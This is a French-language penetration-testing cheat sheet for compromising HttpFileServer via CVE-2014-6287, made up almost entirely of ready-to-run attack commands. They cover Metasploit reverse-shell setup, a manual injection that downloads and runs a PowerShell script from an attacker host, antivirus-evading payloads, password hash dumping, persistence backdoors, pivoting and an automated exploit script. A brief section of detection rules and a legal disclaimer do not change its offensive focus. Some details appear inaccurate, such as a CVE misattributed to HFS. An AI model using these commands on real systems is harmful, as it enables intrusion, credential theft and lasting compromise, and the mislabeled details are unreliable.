# HttpFileService (HFS) - Cheat Sheet Exploitation via Metasploit

## Introduction
HttpFileService (HFS) est un serveur web léger permettant de partager des fichiers facilement. Plusieurs vulnérabilités critiques ont été découvertes, notamment CVE-2014-6287 qui permet l'exécution de code à distance via une injection de commandes dans le paramètre search.

## Informations sur la Vulnérabilité

### CVE-2014-6287 - Remote Code Execution
- **Versions affectées** : HFS 2.3.x
- **Type** : Injection de commandes
- **Severity** : Critique (CVSS 10.0)
- **Vecteur d'attaque** : Paramètre search non filtré
- **Port par défaut** : 80, 8080

### Autres Vulnérabilités HFS
- **CVE-2014-6288** : Directory Traversal
- **CVE-2021-35464** : Path Traversal
- **CVE-2024-23692** : Remote Code Execution

## Reconnaissance et Identification

### Identification du Service
```bash
# Scan Nmap avec détection de version
nmap -sV -p 80,8080,8000 target_ip

# Scan avec scripts NSE pour HFS
nmap --script http-title,http-server-header -p 80 target_ip

# Banner grabbing
curl -I http://target_ip:80
wget -S --spider http://target_ip:80
```

### Fingerprinting HFS
```bash
# Vérifier la page d'accueil HFS
curl http://target_ip:80/

# Rechercher des indicateurs HFS
curl -s http://target_ip:80/ | grep -i "HttpFileServer\|HFS"

# Tester la fonctionnalité search
curl "http://target_ip:80/?search=test"
```

### Énumération des Répertoires
```bash
# Gobuster pour découvrir des répertoires
gobuster dir -u http://target_ip:80/ -w /usr/share/wordlists/dirb/common.txt

# Dirb avec wordlist personnalisée
dirb http://target_ip:80/ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Énumération manuelle des chemins HFS courants
curl http://target_ip:80/~login
curl http://target_ip:80/~files
```

## Exploitation avec Metasploit

### Configuration de Base
```bash
# Lancer Metasploit
msfconsole

# Rechercher les exploits HFS
search hfs
search CVE-2014-6287
```

### Exploit Principal - CVE-2014-6287
```bash
# Utiliser l'exploit HFS RCE
use exploit/windows/http/hfs_command_exec

# Afficher les informations de l'exploit
info

# Afficher les options
show options

# Configuration des paramètres requis
set RHOSTS target_ip
set RPORT 80
set TARGETURI /

# Configuration optionnelle
set LHOST attacker_ip
set LPORT 4444
```

### Configuration des Payloads

#### Meterpreter Windows x86
```bash
# Sélectionner le payload Meterpreter
set payload windows/meterpreter/reverse_tcp
set LHOST attacker_ip
set LPORT 4444

# Vérifier la configuration
show options

# Lancer l'exploitation
exploit
```

#### Meterpreter Windows x64
```bash
# Pour les systèmes 64 bits
set payload windows/x64/meterpreter/reverse_tcp
set LHOST attacker_ip
set LPORT 4445
exploit
```

#### Shell Reverse TCP
```bash
# Shell classique si Meterpreter échoue
set payload windows/shell/reverse_tcp
set LHOST attacker_ip
set LPORT 4446
exploit
```

### Exploitation Manuelle

#### Test de Vulnérabilité
```bash
# Test d'injection de commandes basique
curl "http://target_ip:80/?search=%00{.exec|cmd.exe /c echo vulnerable.}"

# Test avec powershell
curl "http://target_ip:80/?search=%00{.exec|powershell -c echo vulnerable.}"
```

#### Payload Manuel
```bash
# Génération d'un payload Windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe -o payload.exe

# Upload du payload via HFS (si upload disponible)
# Ou utilisation directe dans l'injection
curl "http://target_ip:80/?search=%00{.exec|powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://attacker_ip:8000/payload.ps1')\".}"
```

## Post-Exploitation avec Meterpreter

### Commandes de Base
```bash
# Vérifier la session active
sessions -l

# Interagir avec la session
sessions -i 1

# Informations système
sysinfo
getuid
getpid

# Informations réseau
ipconfig
route
arp
```

### Élévation de Privilèges
```bash
# Rechercher des exploits locaux
run post/multi/recon/local_exploit_suggester

# Exploits UAC bypass courants
use exploit/windows/local/bypassuac_eventvwr
use exploit/windows/local/bypassuac_fodhelper

# Token impersonation
use incognito
list_tokens -u
impersonate_token "NT AUTHORITY\\SYSTEM"
```

### Persistance
```bash
# Installer un service persistant
run persistence -S -U -X -i 10 -p 4445 -r attacker_ip

# Registry persistence
use post/windows/manage/persistence_exe
set SESSION 1
set REXEPATH /path/to/backdoor.exe
run

# Scheduled task
use post/windows/manage/sticky_keys
set SESSION 1
run
```

### Collecte d'Informations
```bash
# Dump des hashs
hashdump
run post/windows/gather/smart_hashdump

# Informations utilisateurs
run post/windows/gather/enum_logged_on_users
run post/windows/gather/enum_users

# Énumération système
run post/windows/gather/enum_applications
run post/windows/gather/enum_computers
run post/windows/gather/enum_patches
```

### Pivoting et Lateral Movement
```bash
# Découverte réseau
run post/multi/gather/ping_sweep RHOSTS=192.168.1.0/24

# Port forwarding
portfwd add -l 8080 -p 80 -r 192.168.1.10

# Route vers réseau interne
route add 192.168.1.0 255.255.255.0 session_id

# Proxy SOCKS
use auxiliary/server/socks4a
set SRVPORT 1080
run -j
```

## Techniques d'Évasion

### Bypass d'Antivirus
```bash
# Encoder le payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -e x86/shikata_ga_nai -i 3 -f exe -o encoded_payload.exe

# Utilisation de templates
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -x /path/to/template.exe -f exe -o trojan.exe
```

### Injection en Mémoire
```bash
# Payload reflective DLL
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f dll -o payload.dll

# PowerShell payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f psh -o payload.ps1
```

### Migration de Processus
```bash
# Lister les processus
ps

# Migrer vers un processus légitime
migrate 1234

# Migration automatique vers explorer.exe
run post/windows/manage/migrate
```

## Cas Pratiques et Scénarios

### Scénario 1 : Serveur HFS par Défaut
```bash
# Configuration Metasploit
use exploit/windows/http/hfs_command_exec
set RHOSTS 192.168.1.100
set RPORT 80
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
exploit
```

### Scénario 2 : HFS avec Authentification
```bash
# Si authentification requise, utiliser auxiliary/scanner d'abord
use auxiliary/scanner/http/hfs_login
set RHOSTS 192.168.1.100
set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
run

# Puis utiliser les credentials trouvés
use exploit/windows/http/hfs_command_exec
set RHOSTS 192.168.1.100
set HttpUsername found_user
set HttpPassword found_pass
exploit
```

### Scénario 3 : HFS sur Port Non-Standard
```bash
# Scanner les ports pour HFS
use auxiliary/scanner/http/http_version
set RHOSTS 192.168.1.0/24
set PORTS 80,8080,8000,8888,9999
run

# Exploiter sur port découvert
use exploit/windows/http/hfs_command_exec
set RHOSTS target_ip
set RPORT 8080
exploit
```

## Détection et Contre-mesures

### Détection d'Exploitation
```bash
# Logs Windows à surveiller
# Event ID 4688 - Process creation
# Event ID 4624 - Logon success
# Event ID 4648 - Logon with explicit credentials

# Surveillance réseau
# Connexions vers ports inhabituels
# Trafic HTTP suspect vers /search
# Téléchargements de fichiers exécutables
```

### Signatures IDS/IPS
```bash
# Signature Snort pour CVE-2014-6287
alert tcp any any -> any any (msg:"HFS Command Execution Attempt"; content:"search="; content:"%00{.exec"; sid:1000001;)

# Détection PowerShell
alert tcp any any -> any any (msg:"HFS PowerShell Injection"; content:"powershell"; content:".exec"; sid:1000002;)
```

### Mitigation
```bash
# Mise à jour vers version patched
# Restriction d'accès par IP
# WAF/Proxy inverse avec filtrage
# Monitoring des processus enfants HFS
# Désactivation de la fonction search si non nécessaire
```

## Automatisation et Scripts

### Script d'Exploitation Automatique
```bash
#!/bin/bash
# hfs_auto_exploit.sh

TARGET=$1
LHOST=$2
LPORT=${3:-4444}

if [ $# -lt 2 ]; then
    echo "Usage: $0 <target_ip> <local_ip> [local_port]"
    exit 1
fi

# Vérifier si HFS est présent
if curl -s "http://$TARGET/" | grep -qi "HttpFileServer\|HFS"; then
    echo "[+] HFS détecté sur $TARGET"
    
    # Lancer Metasploit
    msfconsole -q -x "
        use exploit/windows/http/hfs_command_exec;
        set RHOSTS $TARGET;
        set LHOST $LHOST;
        set LPORT $LPORT;
        set payload windows/meterpreter/reverse_tcp;
        exploit;
    "
else
    echo "[-] HFS non détecté sur $TARGET"
fi
```

### Resource Script Metasploit
```bash
# hfs_exploit.rc
use exploit/windows/http/hfs_command_exec
set RHOSTS file:targets.txt
set LHOST 192.168.1.50
set LPORT 4444
set payload windows/meterpreter/reverse_tcp
set AutoRunScript post/multi/manage/shell_to_meterpreter
exploit -j -z
```

## Références et Documentation

### CVE et Advisories
- **CVE-2014-6287** : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6287
- **HFS Security Advisory** : https://www.rapid7.com/db/modules/exploit/windows/http/hfs_command_exec/
- **Metasploit Module** : https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/http/hfs_command_exec.rb

### Outils Complémentaires
- **HFS Version Scanner** : `auxiliary/scanner/http/hfs_version`
- **HFS Directory Traversal** : `auxiliary/scanner/http/hfs_traversal`
- **Payload Generator** : `msfvenom`

---

**Note de Sécurité** : Cette cheat sheet est destinée uniquement à des fins éducatives et de test de sécurité autorisé. L'exploitation de vulnérabilités sans autorisation explicite est illégale et contraire à l'éthique.